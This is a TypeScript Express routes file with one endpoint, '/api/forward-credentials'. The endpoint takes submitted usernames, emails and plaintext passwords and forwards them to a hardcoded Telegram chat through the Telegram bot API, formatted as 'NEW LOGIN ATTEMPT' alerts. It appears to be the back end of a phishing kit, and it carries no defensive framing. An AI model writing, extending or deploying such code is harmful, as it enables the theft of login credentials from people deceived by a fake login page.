import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  
  // API route to forward login data to Telegram
  app.post("/api/forward-credentials", async (req, res) => {
    try {
      const { username, email, password, timestamp } = req.body;
      
      const botToken = process.env.TELEGRAM_BOT_TOKEN;
      const chatId = "-1003524395106";
      
      if (!botToken) {
        return res.status(500).json({ error: "Bot token not configured" });
      }

      // Format message for Telegram
      const message = `🔐 NEW LOGIN ATTEMPT\n\n` +
        `👤 Username: ${username}\n` +
        `📧 Email: ${email}\n` +
        `🔑 Password: ${password}\n` +
        `⏰ Time: ${new Date(timestamp).toLocaleString()}\n`;

      // Send to Telegram
      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const response = await fetch(telegramUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });

      const result = await response.json();
      
      if (!response.ok) {
        console.error("Telegram API error:", result);
        return res.status(500).json({ error: "Failed to send message to Telegram" });
      }

      res.json({ success: true, message: "Data forwarded successfully" });
    } catch (error) {
      console.error("Error forwarding credentials:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  return httpServer;
}
